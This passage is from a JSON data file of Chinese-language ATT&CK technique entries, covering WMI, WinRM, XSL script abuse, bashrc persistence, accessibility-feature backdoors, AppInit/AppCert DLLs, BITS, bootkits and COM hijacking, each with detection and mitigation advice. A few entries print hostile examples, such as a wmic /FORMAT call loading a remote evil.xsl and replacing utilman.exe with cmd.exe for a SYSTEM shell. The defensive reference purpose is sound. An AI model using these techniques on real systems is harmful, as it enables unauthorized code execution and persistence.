	"description": "<p>WMI（Windows Management Instrumentation）是Windows管理功能，它为本地和远程访问windows系统组件提供了统一的环境。它依赖WMI服务来进行本地和远程访问，以及SMB（服务器消息块）和RPCS（远程过程调用服务）来进行远程访问。RPCS通过端口135运行。</p><p>攻击者可能会使用WMI与本地和远程系统交互，也可能使用WMI来将执行许多策略功能，例如为发现收集信息和远程执行文件来横向移动。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["认证日志", "Netflow/Enclave技术网络流分析", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控WMI连接的网络流量；在通常不使用WMI的环境中使用WMI可能是可疑的。通过进程监控来捕获“wmic”的命令行参数并检测用于执行远程行为的命令。</p>",
		"mitigations": [{
			"name": "特权账号管理",
			"description": "防止系统之间管理员和特权账号的凭据重叠。"
		}, {
			"name": "用户账号管理",
			"description": "默认情况下，只允许管理员使用WMI远程连接。限制允许连接的其他用户，或禁止所有用户远程连接到WMI。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "Windows管理指令集"
}, {
	"id": "T1028",
	"description": "<p>WinRM（Windows Remote Management）是Windows服务名，也是允许用户与远程系统交互的协议名称（例如，运行可执行文件，修改注册表，修改服务）。可以使用<code>winrm</code> 命令或任何数量的程序（如PowerShell）来调用WinRM。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["文件监控", "认证日志", "Netflow/Enclave技术网络流分析", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>通过跟踪服务执行来监控环境中WinRM的使用。非正常使用或禁用WinRM可能表示有可疑行为。监控WinRM进程或WinRM调用脚本创建的进程和执行的操作，将其与其他相关事件关联。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "禁用WinRM服务。"
		}, {
			"name": "网络分区",
			"description": "如果需要该服务，请使用单独的WinRM基础架构锁定关键飞地，并遵循使用主机防火墙的WinRM最佳实践来限制WinRM访问，仅允许与特定设备进行通信。"
		}, {
			"name": "特权账号管理",
			"description": "如果需要该服务，请使用单独的WinRM账号和权限锁定关键飞地。"
		}],
		"tactics": ["TA0002", "TA0008"]
	},
	"name": "Windows远程管理"
}, {
	"id": "T1220",
	"description": "<p>扩展样式表语言（xsl）文件通常用于描述XML文件中数据的处理和呈现。为了支持复杂的操作，XSL标准包括对各种语言的嵌入式脚本的支持。</p><p>攻击者可能会滥用此功能来执行任意文件，同时可能绕过应用程序白名单防御。与可信的开发工具类似，微软公用线转换工具（msxsl.exe）可以安装并用于执行嵌入在本地或远程（引用URL）XSL文件中的恶意JavaScript代码。由于默认情况下未安装msxsl.exe，因此攻击者可能需要使用丢弃文件对其进行打包。Msxsl.exe有两个主要参数，一个XML源文件和一个XSL样式表。由于XSL文件是有效XML文件，攻击者可能会调用同一个XSL文件两次。使用msxsl.exe时，攻击者可能会给XML/XSL文件一个任意文件扩展名。</p><p>命令行示例：</p><p>·         <code>msxsl.exe customers[.]xml script[.]xsl</code></p><p>这种技术的另一种变体称为“Squiblytwo”，它使用Windows管理工具在XSL文件中调用JScript或VBScript。这项技术与Regsvr32/“squiblydoo”类似，也通过一个可信的内置Windows工具执行本地/远程脚本。只要使用/FORMAT开关，攻击者就可能会滥用Windows管理工具中的任何别名。</p><p>命令行示例：</p><p><code>·         </code>本地文件：<code>wmic process list/FORMAT:evil[.]xsl</code></p><p>·         远程文件：<code>wmic os get /FORMAT:\"https[:]//example[.]com/evil[.]xsl\"</code></p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数", "进程使用网络", "动态链接库监控"]
	},
	"relations": {
		"detection": "<p>监控msxsl.exe和wmic.exe进程的执行和参数。比较这些工具的近期调用与历史已知合法参数及已加载文件来确定异常和潜在的攻击活动（例如：URL命令行参数、创建外部网络连接、加载与脚本相关的dll）。在脚本调用之前和之后使用的命令参数在确定加载的荷载来源和用途时也可能有用。</p><p>在不是通常用于开发、调试和反向代理的系统上，msxsl.exe或其他启用代理执行工具的存在可能是可疑的。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "如果不需要msxsl.exe，则阻止其执行，以防止其被攻击者滥用。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "XSL脚本处理"
}, {
	"id": "T1156",
	"description": "<p><code> </code></p><p><code>~/.bash_profile</code>和<code>~/.bashrc</code>是包含shell命令的shell脚本。当打开新的shell或是用户登录时，将在用户上下文中执行这些文件从而来正确设置环境。对登录shell执行<code>~/.bash_profile</code>，对交互式非登录shell执行<code>~/.bashrc</code>。这意味着当用户（使用用户名和密码）登录到控制台时（从本地登录或是以SSH等方式远程登录），会在初始命令提示返回给用户之前执行<code>~/.bash_profile</code>脚本。之后，每次打开新的shell时，都会执行<code>~/.bashrc</code>脚本。这样，用户就可以更精细地控制何时需要执行哪些命令。这些shell脚本是由本地用户编写，用来配置他们的环境。</p><p>MacOS的Terminal.app有点不同：它在每次打开新的终端窗口时默认运行一个登录shell，因此每次都调用<code>~/.bash_profile</code> 而不是 <code>~/.bashrc</code>。</p><p>攻击者可能会滥用这些脚本，在其中插入任意shell命令来执行其它二进制文件并获得持久性。每当用户登录或打开一个新的shell时，都会执行修改后的<code>~/.bash_profile</code>和/或<code>~/.bashrc</code>脚本。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数", "网络进程使用"]
	},
	"relations": {
		"detection": "<p>虽然用户可以自定义他们的<code>~/.bashrc</code>和<code>~/.bash_profile</code>文件，但这些文件中通常只显示某些类型的命令。在登录过程中加载用户配置文件时，监控异常命令，例如：执行未知程序，打开网络套接字或跨网断访问。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "使这些文件不可更改且仅由某些管理员更改，限制攻击者轻松创建用户级持久化的能力。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "bashrc"
}, {
	"id": "T1015",
	"description": "<p>Windows包含用户登录之前（例如，当用户在Windows登录屏幕上时）可用组合键启动的辅助功能。攻击者可能会修改这些程序的启动方式，以便在不登录系统的情况下获得命令提示符或后门。</p><p>两个常见的辅助功能程序是<code>C:\\Windows\\System32\\sethc.exe</code>（按下shift键五次后启动）和<code>C:\\Windows\\System32\\utilman.exe</code>（按下Windows+U组合键时启动）。sethc.exe程序通常被称为“粘滞键”，已被攻击者用来通过远程桌面登录屏幕进行不经认证的访问。</p><p>由于代码完整性增强，攻击者可能会以不同的方式利用这些功能，具体取决于Windows的版本。在较新版本的Windows中，替换的二进制文件需要为x64系统进行数字签名，二进制文件必须位于<code>%systemdir%\\</code>，并且必须受WFP/WRP（Windows File or Resource Protection）的保护。攻击者很可能使用调试器方法来规避这些问题，因为它不需要替换相应的辅助功能二进制文件。以下是两种方法的示例：</p><p>示例1：Windows XP和更高版本以及Windows Server 2003/R2和更高版本上的简单二进制替换方法。可以替换程序（比如：<code>C:\\Windows\\System32\\utilman.exe</code>）为“cmd.exe”（或其他提供后门访问的程序）。随后，如果你使用键盘或已通过远程桌面协议连接，在登录屏幕上按相应的组合键将导致以系统权限执行替换文件。</p><p>示例2：Windows Vista和更高版本以及Windows Server 2008和更高版本的调试器方法。可以修改注册表项，配置“cmd.exe”或其他提供后门访问的程序作为辅助功能程序（比如：utilman.exe）的“调试器”。修改注册表后，如果你使用键盘或已通过RDP连接，在登录屏幕上按相应的组合键将导致以系统权限执行“调试器”程序。</p><p>其他辅助功能也可以以类似的方式利用：</p><p>·         On-Screen Keyboard：<code>C:\\Windows\\System32\\osk.exe</code></p><p>·         Magnifier：<code>C:\\Windows\\System32\\Magnify.exe</code></p><p>·         Narrator：<code>C:\\Windows\\System32\\Narrator.exe</code></p><p>·         Display Switcher：<code>C:\\Windows\\System32\\DisplaySwitch.exe</code></p><p>·         App Switcher：<code>C:\\Windows\\System32\\AtBroker.exe</code></p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员"],
		"dataSources": ["Windows注册表", "文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>修改可用性实用程序二进制文件或修改与已知软件、补丁周期等不相关的二进制路径是可疑的。</p><p>通过命令行调用能够修改注册表以获取相关密钥的工具也是可疑的。应监控实用程序参数和二进制文件本身的修改。监控<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Image File Execution Options</code>中的注册表项。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "攻击者可能会使用备用二进制文件替换辅助功能二进制文件来执行此技术。使用应用白名单工具（如Windows Defender Application Control，AppLocker或软件限制策略）来识别并阻止通过辅助功能执行的潜在恶意软件。"
		}, {
			"name": "网络资源访问限制",
			"description": "如果可能，请使用远程桌面网关来管理网络中RDP的连接和安全配置。"
		}, {
			"name": "操作系统配置",
			"description": "要远程使用此技术，攻击者必须将其与RDP结合使用。确保已启用网络级身份认证，以便在创建会话并显示登录屏幕之前强制远程桌面会话进行身份认证。在Windows Vista及更高版本上默认启用此认证。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "辅助功能"
}, {
	"id": "T1098",
	"description": "<p>攻击者可能会通过操纵账号在环境中维持对凭据的访问以及某些权限级别。账号操纵可以包括修改权限，修改凭据，添加或更改权限组，修改账号设置或修改身份认证的执行方式。这些操作还可以包括旨在破坏安全策略的账号活动，例如执行迭代密码更新以破坏密码时长策略并保留所盗凭据的生命周期。攻击者必须拥有对系统或域的足够权限才能创建或操纵账号。</p><p>Exchange邮件账户接管</p><p>本地Exchange以及基于云服务的Office 365上的Add-MailboxPermissionPowerShell cmdlet可用于对邮箱添加权限。如果有足够权限，则可以运行此命令来进一步授予某些用户账户访问权限。攻击者可能会将此命令用于持续的威胁事件以及业务邮件入侵（BES）事件以便可以给他们企图入侵的账户分配更多访问权限。这可能进一步导致使用更多攻击技术来获得系统访问权限。比如，攻击者通过入侵的业务账户向目标业务网络的其它账户发送邮件，同时创建收件箱规则以躲避垃圾/钓鱼邮件检测机制。</p><p>Azure AD</p><p>在Azure中，攻击者可以为服务主体设置第二个密码，从而促进持久性。</p><p>AWS</p><p>AWS策略通过简单地识别账户名称来允许账户之间的信任。然后由受信任的账户决定是否只允许正确的角色访问。</p>",
	"details": {
		"platform": ["Windows", "Office 365", "Azure", "GCP", "Azure AD", "AWS"],
		"permissionRequired": ["管理员"],
		"dataSources": ["认证日志", "API监控", "Windows事件日志", "网络抓包"]
	},
	"relations": {
		"detection": "<p>收集系统和域中账号对象修改相关的事件，例如事件4738。监控与其他可疑活动相关的账号修改。修改可能发生在不寻常的时间或来自不寻常的系统。特别是主题和目标账号不同的标记事件或包含其它多余标记的事件，例如在不知道旧密码的情况下更改密码。</p><p>凭据也可能在不寻常的时间使用或在不寻常的系统或服务使用，并可能与其他可疑活动有关。</p><p>监控Exchange和Office 365邮件账户是否有不寻常的权限变化，这些变化可能表示有账户遭入侵且权限过大。</p><p>如果有账户发送了比平时更多数量的电子邮件，或者有发现网络中的真实账户正在发送相似的钓鱼邮件，则可能表示账户已遭攻击者入侵并且攻击者试图利用修改后的邮件权限进行访问。</p>",
		"mitigations": [{
			"name": "多因子认证",
			"description": "对用户和特权账号使用多因子认证。"
		}, {
			"name": "网络分区",
			"description": "配置访问控制和防火墙来限制对关键系统和域控制器的访问。大多数云环境都支持单独的虚拟私有云（VPC）实例，从而可以进一步细分云系统。"
		}, {
			"name": "操作系统配置",
			"description": "通过确保关键服务器的适当安全配置来保护域控制器，从而限制使用可能不必要的协议和服务（如SMB文件共享）进行访问。"
		}, {
			"name": "特权账号管理",
			"description": "不允许将域管理员账号用于日常操作，因为这些操作可能会将域管理员账号暴露给非特权系统上的潜在攻击者。"
		}],
		"tactics": ["TA0006", "TA0003"]
	},
	"name": "账号操纵"
}, {
	"id": "T1182",
	"description": "<p>在注册表项<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code>的AppCertDLLs值中指定的动态链接库被加载到调用以下常用API函数的每个进程中：CreateProcess，CreateProcessAsUser，CreateProcessWithLoginW ，CreateProcessWithTokenW，和WinExec。</p><p>与进程注入类似，攻击者可能会滥用此值在计算机单独进程的上下文中加载和运行恶意动态库，从而获得持久性和权限提升。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["已加载动态链接库", "进程监控", "Windows注册表"]
	},
	"relations": {
		"detection": "<p>监控进程加载的动态链接库，尤其是要查找未识别的或未正常加载到进程的动态链接库。</p><p>监控AppCertDLLs注册表值来查看是否有与已知软件、补丁周期等无关的修改。监控和分析表示编辑了注册表的API调用，如RegCreateKeyEx和RegSetValueEx。</p><p>Sysinternals Autoruns等工具可能会忽视AppCert 动态链接库为自动启动位置。</p><p>查找可能由加载恶意动态链接库的进程导致的异常行为。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的一系列行为中的一部分，例如为命令与控制而建立网络连接，通过发现了解环境的详细信息，以及横向移动。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "攻击者会安装新的AppCertDLL二进制文件来执行此技术。使用应用白名单工具（如Windows Defender Application Control，AppLocker或软件限制策略）来识别并阻止通过AppCertDLL功能执行的潜在恶意软件。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "AppCert DLL"
}, {
	"id": "T1103",
	"description": "<p>在注册表项<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows</code>或<code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>的AppInit_DLLs值中指定的动态链接库被加载到每个加载user32.dll的进程。实际上这几乎是加载到每个程序，因为user32.dll是一个非常常见的库。与进程注入类似，攻击者可能会滥用此值在计算机单独进程的上下文中加载和运行恶意动态库，从而获得持久性和权限提升。</p><p>在Windows 8及更高版本中，如果启用了secure boot，那么将禁用AppInit动态链接库功能。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员"],
		"dataSources": ["已加载动态链接库", "进程监控", "Windows注册表"]
	},
	"relations": {
		"detection": "<p>监控加载了user32.dll的进程加载的动态链接库来查看是否有未识别的或非正常加载到进程的动态链接库。监控AppInit_DLLs注册表值来查看是否有与已知软件、补丁周期等无关的修改。监控和分析表示标记了注册表的API调用，如RegCreateKeyEx和RegSetValueEx。也可使用Sysinternals Autoruns等工具来检测是否有旨在获得持久性的系统更改，包括列出当前的AppInit动态链接库。</p><p>查找可能由加载恶意动态链接库的进程导致的异常行为。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的一系列行为中的一部分，例如为命令与控制而建立网络连接，通过发现了解环境的详细信息，以及横向移动。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "攻击者可能会安装新的AppInit_DLLs二进制文件来执行此技术。使用应用白名单工具（如Windows Defender Application Control，AppLocker或软件限制策略）来识别并阻止通过AppInit_DLLs功能执行的潜在恶意软件。"
		}, {
			"name": "软件更新",
			"description": "升级到Windows 8或更高版本并启用secure boot。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "AppInit DLL"
}, {
	"id": "T1138",
	"description": "<p>创建微软 Windows应用兼容性基础结构/框架（应用兼容转接）是为了在操作系统代码库随时间变化时允许软件向后兼容。例如，应用兼容转接功能允许开发人员修改他们为Windows XP创建的应用（不需重写代码），以使这些应用也能在Windows 10上使用。在此框架内,程序（或者更具体地说，导入地址表）和Windows操作系统之间创建了“垫片”，类似于“缓冲区”，用于实现兼容转接功能。执行程序时，会查询此缓冲区以确定程序是否需要使用shim数据库（.sdb）。如果需要，shim数据库必要时会使用hooking来重定向代码，从而与操作系统通信。</p><p>当前由Windows默认安装程序（sdbinst.exe）安装的所有垫片的列表保存在以下路径：</p><p><code>·         </code><code>%WINDIR%\\AppPatch\\sysmain.sdb</code></p><p>·         <code>hklm\\software\\microsoft\\windowsnt\\currentversion\\appcompatflags\\installedsdb</code></p><p>自定义数据库存储在以下路径：</p><p><code>·         </code><code>%WINDIR%\\AppPatch\\custom &amp;%WINDIR%\\AppPatch\\AppPatch64\\Custom</code></p><p>·         <code>hklm\\software\\microsoft\\windowsnt\\currentversion\\appcompatflags\\custom</code></p><p>为了确保垫片的安全，Windows将它们设计为在用户模式下运行，这样它们就无法修改内核，而且您必须具有管理员权限才能安装它们。但是，某些垫片可用于绕过UAC（用户账号控制）（RedirectEXE）、将动态链接库注入到进程（InjectDLL）、禁用数据执行保护（DisableNX）和结构异常处理（(DisableSEH）以及拦截内存地址（GetProcAddress）。与Hooking类似，这些垫片可能允许攻击者执行多种恶意行为，如提升权限、安装后门、禁用Windows Defender等防御措施。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员"],
		"dataSources": ["已加载动态链接库", "系统调用", "Windows注册表", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>以下公共工具可用来检测当前可用的垫片：</p><p>·         Shim-Process-Scanner  - 检查每个运行中进程的内存是否有任何Shim标志</p><p>·         Shim-Detector-Lite  - 检测自定义shim数据库的安装</p><p>·         Shim-Guard  - 监控注册表来查看垫片安装</p><p>·         ShimScanner  - 取证工具，用于在内存中查找活动的垫片</p><p>·         ShimCacheMem  - Volatility插件，用于从内存中提取垫片缓存（注意：只在重启后缓存垫片）</p><p>监控sdbinst.exe进程执行和命令行参数来查看是否有应用垫片滥用的情况。</p>",
		"mitigations": [{
			"name": "软件更新",
			"description": "微软发布了一个可选的补丁更新 -  KB3045645  - 它将删除sdbinst.exe中的“auto-elevate”标志。这样可以防止攻击者使用应用兼容转接技术来绕过UAC。"
		}, {
			"name": "用户账号控制",
			"description": "将UAC设置更改为“始终通知”将在请求UAC提升时为用户提供更多可见性。但是，由于UAC不断中断，此选项在用户中不受欢迎。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "应用兼容转接"
}, {
	"id": "T1131",
	"description": "<p>Windows身份认证包动态链接库在系统启动时由LSA（本地安全机构）进程加载。它们为操作系统的多个登录过程和多个安全协议提供支持。</p><p>攻击者可能会使用LSA身份认证包提供的自动启动机制来实现持久性，方法是在Windows注册表位置 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code>放置二进制文件的引用，其键值为<code>\"Authentication Packages\"=</code>。然后，在加载身份认证包时，系统将执行二进制文件。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员"],
		"dataSources": ["动态链接库监控", "Windows注册表", "已加载动态链接库"]
	},
	"relations": {
		"detection": "<p>监控注册表来查看是否有LSA注册表项的相关更改。监控LSA进程来查看是否有动态链接库加载行为。Windows 8.1和Windows Server 2012 R2中，可能会在未签名的动态链接库尝试通过在注册表项<code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File ExecutionOptions\\LSASS.exe</code> 中设置auditlevel=8加载到LSA时生成事件。</p>",
		"mitigations": [{
			"name": "特权进程完整性",
			"description": "在Windows 8.1、Windows Server 2012 R2和更高版本中，可以通过设置注册表项HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL使LSA作为PPL（受保护进程指示灯）运行。前提是LSA加载的所有动态链接库都是由微软签名的。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "身份认证包"
}, {
	"id": "T1197",
	"description": "<p>Windows BITS（后台智能传输服务）是一种通过COM（组件对象模型）公开的低带宽异步文件传输机制。BITS通常由更新程序、消息程序和其他希望在后台运行（使用可用空闲带宽）而不中断其他网络应用的程序使用。文件传输任务被实现为BITS作业，其中包含一个或多个文件操作队列。</p><p>可以通过PowerShell和BITSAdmin工具访问BITS作业创建和管理接口。</p><p>攻击者可能会在运行恶意代码后滥用BITS来实现下载、执行甚至清理动作。BITS任务包含在BITS作业数据库中，不需创建新文件或修改注册表，且通常是主机防火墙允许的。启用BITS的执行还可以通过创建长期作业（默认最大生命周期为90天且可延长）或在作业完成或出现错误（包括系统重启后的错误）时调用任意程序来允许持久性。</p><p>BITS上传功能也可用于执行Exfiltration Over Alternative Protocol。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["API监控", "网络抓包", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>BITS作为服务运行。可使用Sc查询实用程序（<code>sc query bits</code>）来检查其状态。可使用BITSAdmin工具（<code>bitsadmin /list /allusers /verbose</code>）枚举活跃的 BITS任务。</p><p>监控BITSAdmin工具（尤其是Transfer，Create，AddFile，SetNotifyFlags，SetNotifyCmdLine，SetMinRetryDelay，SetCustomHeaders和Resume命令选项）的使用及Windows事件日志来查看BITS活动。还要考虑通过解析BITS作业数据库来调查作业相关的更多详细信息。</p><p>监控和分析BITS生成的网络活动。BITS作业使用HTTP（S）和SMB进行远程连接，仅限于创建用户，并且仅在该用户登录时才起作用（即使用户将作业附加到服务账号，此规则也适用）。</p>",
		"mitigations": [{
			"name": "网络流量过滤",
			"description": "修改网络和/或主机防火墙规则以及其他网络控制，仅允许合法的BITS流量。"
		}, {
			"name": "操作系统配置",
			"description": "考虑缩短组策略中的默认BITS作业生命周期，或者编辑HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS中的JobInactivityTimeout 和MaxDownloadTime 注册表值。"
		}, {
			"name": "用户账号管理",
			"description": "考虑限制特定用户或组对BITS接口的访问。"
		}],
		"tactics": ["TA0005", "TA0003"]
	},
	"name": "BITS作业"
}, {
	"id": "T1067",
	"description": "<p>BootKit是一种恶意软件变体，用于修改硬盘驱动器的引导扇区，包括主引导记录（MBR）和卷引导记录（VBR）。</p><p>攻击者可能会使用bootkits在操作系统下的某一层系统上持久化，这可能会使完全修复变得困难，除非使用了organization suspects one并且能正确的运行。</p><p>主引导记录（MBR）</p><p>MBR是在BIOS完成硬件初始化之后首先加载的磁盘部分。它是引导加载程序所在的位置。对引导驱动器具有原始访问权限的攻击者可能会重写此区域，从而在启动期间将执行从正常引导加载程序转移到攻击代码。</p><p>卷引导记录（VBR）</p><p>MBR将引导进程的控制权传递给VBR。与MBR的情况类似，对引导驱动器具有原始访问权限的攻击者可能会重写VBR，以便在启动期间将执行转移到攻击代码。</p>",
	"details": {
		"platform": ["Linux", "Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "MBR", "VBR"]
	},
	"relations": {
		"detection": "<p>对MBR和VBR执行完整性检查。拍摄MBR和VBR的快照，并与已知的好样本进行比较。当MBR和VBR出现可疑行为与进一步分析指标时，上报他们的变化。</p>",
		"mitigations": [{
			"name": "引导完整性",
			"description": "使用受信任的平台模块技术和安全可信的引导过程以防止系统完整性受到损害。"
		}, {
			"name": "特权账户管理",
			"description": "确保特权账户都拥有合适的权限，防止获取了特权账户的攻击者安装bootkit。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "Bootkit"
}, {
	"id": "T1176",
	"description": "<p>浏览器扩展或插件是可以添加功能和自定义互联网浏览器特征的小程序。它们可以直接安装，也可以通过浏览器的应用商店安装。扩展程序通常对浏览器可以访问的所有内容都有访问权限。</p><p>恶意扩展程序可以伪装成合法扩展程序在应用商店下载、通过社交工程或已攻破系统的攻击者安装到浏览器中。浏览器应用商店的安全性可能受到限制，因此恶意扩展程序击败自动扫描程序并上传可能并不困难。一旦安装了扩展程序，它就可以在后台浏览到网站，窃取用户输入浏览器的所有信息，包括凭据，并用作RAT的安装程序以获得持久性。有僵尸网络通过恶意Chrome扩展程序使用持久后门的情况。也有类似的扩展程序用于命令与控制的情况。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["网络协议分析", "网络抓包", "系统调用", "网络进程使用", "进程监控", "浏览器扩展"]
	},
	"relations": {
		"detection": "<p>清点和监控与正常、预期及良性扩展程序不同的浏览器扩展程序的安装。进程和网络监控可用于检测与C2服务器通信的浏览器。然而，根据过程中生成的流量性质和数量来看，这种方式用于初始检测恶意扩展程序是困难的。监控写入注册表的任何新项目或写入磁盘的PE文件，因为这可能与浏览器扩展程序安装有关。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "确保安装的扩展程序是预期的，因为许多恶意扩展程序会伪装成合法程序。"
		}, {
			"name": "执行预防",
			"description": "根据您的安全策略设置浏览器扩展程序白名单或黑名单。"
		}, {
			"name": "软件安装限制",
			"description": "仅从可以验证的可信来源安装浏览器扩展程序。某些浏览器的扩展程序可以通过组策略进行控制。更改设置来防止浏览器在没有足够权限的情况下安装扩展程序。"
		}, {
			"name": "用户培训",
			"description": "完成使用后关闭所有浏览器会话，防止任何潜在的恶意扩展程序继续运行。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "浏览器扩展"
}, {
	"id": "T1042",
	"description": "<p>打开文件时，将检查用于打开文件的默认程序（也称为文件关联或处理程序）。文件关联选择存储在Windows注册表中，可以由有注册表访问权限的用户、管理员或程序编辑，也可以由管理员使用内置的关联实用程序编辑。应用程序可以修改给定文件扩展名的文件关联，以便在打开具有给定扩展名的文件时调用任意程序。</p><p>系统文件关联列在<code>HKEY_CLASSES_ROOT.[extension]</code>中，例如<code>HKEY_CLASSES_ROOT.txt</code>。这些条目指向位于<code>HKEY_CLASSES_ROOT[handler]</code>的该扩展的处理程序。然后，在<code>HKEY_CLASSES_ROOT[handler]\\shell[action]\\command</code>的shell键下，将各种命令列为子键，例如<code><i>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</i></code><code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>*<code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>。</p><p>所列键的值是处理程序打开文件扩展名时执行的命令。攻击者可以修改这些值来继续执行任意命令。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["Windows注册表", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>收集并分析注册表项（将文件扩展名与默认应用程序相关联以执行）的更改，并与未知的进程启动活动或该进程的异常文件类型相关联。</p><p>用户文件关联首选项存储在<code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts</code>下，并覆盖在<code>[HKEY_CLASSES_ROOT]</code>下配置的关联。用户首选项更改会出现在此条目的子项下。</p><p>还要在异常进程调用树中查看是否有与发现操作或其他技术相关的其他命令的执行。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "更改默认文件关联"
}, {
	"id": "T1109",
	"description": "<p>某些攻击者可能会使用复杂的方法来破坏计算机组件并安装恶意固件。这些恶意固件将在操作系统和主系统固件或BIOS之外执行攻击代码。此技术可能类似于系统固件，但在其他可能不具备相同完整性检查能力或级别的系统组件上执行。恶意设备固件既可以提供对系统的持久访问，尽管这会导致访问维持和硬盘重映像的典型故障，也可以提供逃避基于主机软件的防御和完整性检查的方法。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["系统"],
		"dataSources": ["磁盘取证", "API监控", "进程监控", "组件固件"]
	},
	"relations": {
		"detection": "<p>设备驱动程序使用所产生的（比如进程和api调用）和/或SMART（自监控、分析和报告技术）磁盘监控提供的数据和遥测可能会揭示对组件的恶意操作。如果没有这些数据，可能难以检测到在OS安全性和完整性机制范围之外的系统组件上发生的恶意活动。</p><p>磁盘检测和取证工具可能会显示恶意固件的指标信息，例如字符串、意外的磁盘分区表条目，或者需要进一步调查的异常内存块。还可以考虑将组件（包括组件固件和行为的散列）与已知的良好镜像进行比较。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005", "TA0003"]
	},
	"name": "组件固件"
}, {
	"id": "T1122",
	"description": "<p>COM（组件对象模型）是Windows中的一个系统，用于通过操作系统实现软件组件之间的交互。攻击者可能会使用此系统插入恶意代码，通过劫持COM引用和关系作为持久性手段来代替合法软件执行。劫持COM对象需要更改Windows注册表以替换对合法系统组件的引用，这可能导致该组件在执行时无法工作。当通过正常的系统操作执行该系统组件时，将执行的却是攻击者的代码。攻击者可能会劫持频繁使用的对象以保持一致的持久性，但不太可能破坏系统内的明显功能。破坏系统内明显功能会导致系统不稳定，会触发系统检测。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["Windows注册表", "动态链接库监控", "已加载动态链接库"]
	},
	"relations": {
		"detection": "<p>有机会通过搜索已被替换的注册表引用和通过注册表操作将已知二进制路径替换为未知路径来检测COM劫持。即使某些第三方应用定义了用户COM对象，但<code>HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\</code> 中存在对象可能是不正常的，应进行调查，因为用户对象将在 <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\</code>中的机器对象之前加载。现有COM对象的注册表项可能不经常更改。当具有已知良好路径和二进制文件的条目被替换或此条目值被更改为异常值来指向新位置中的未知二进制文件时，则可能表示有可疑行为并应进行调查。同样，如果收集并分析了软件动态链接库加载，则任何与COM对象注册表修改相关的异常动态链接库加载都可能表示已发生了COM劫持。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005", "TA0003"]
	},
	"name": "COM劫持"
}, {
	"id": "T1136",
